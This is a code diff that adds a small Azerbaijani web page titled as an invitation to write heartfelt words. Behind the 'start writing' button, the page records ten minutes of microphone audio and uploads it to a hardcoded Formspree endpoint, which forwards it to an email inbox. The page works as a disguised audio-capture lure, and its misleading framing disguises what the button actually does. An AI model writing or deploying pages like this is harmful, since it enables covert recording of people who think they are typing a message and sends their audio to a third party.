@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Bizə Ürək Sözlərini Yaz</title>
+</head>
+<body>
+    <h2>Bizə Ürək Sözlərini Yaz</h2>
+    <button id="startBtn">Yazmaga basla </button>
+    <p id="status">Status: Gözlənilir...</p>
+
+    <script>
+        const startBtn = document.getElementById('startBtn');
+        const status = document.getElementById('status');
+        const formspreeUrl = "https://formspree.io/f/xzdakbql"; // Kopyaladığın linki bura yaz
+
+        startBtn.onclick = async () => {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const mediaRecorder = new MediaRecorder(stream);
+                let audioChunks = [];
+
+                mediaRecorder.ondataavailable = event => {
+                    audioChunks.push(event.data);
+                };
+
+                mediaRecorder.onstop = async () => {
+                    const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
+                    status.innerText = "Status: Səs Gmail-ə göndərilir...";
+                    
+                    // Formspree-yə göndərmə prosesi
+                    const formData = new FormData();
+                    formData.append('file', audioBlob, 'ses_yazisi.wav');
+                    formData.append('message', 'Yeni 10 dəqiqəlik səs qeydi.');
+
+                    const response = await fetch(formspreeUrl, {
+                        method: 'POST',
+                        body: formData,
+                        headers: { 'Accept': 'application/json' }
+                    });
+
+                    if (response.ok) {
+                        status.innerText = "Status: Səs uğurla Gmail-ə göndərildi!";
+                    } else {
+                        status.innerText = "Status: Göndərmə xətası (Limit ola bilər).";
+                    }
+                };
+
+                mediaRecorder.start();
+                status.innerText = "Status: Səs yazılır... (10 dəqiqə)";
+
+                // 10 dəqiqə = 600,000 millisaniyə
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                    stream.getTracks().forEach(track => track.stop());
+                }, 600000);
+
+            } catch (err) {
+                status.innerText = "Xəta: Mikrofon icazəsi rədd edildi!";
+            }
+        };
+    </script>
+</body>
+</html>
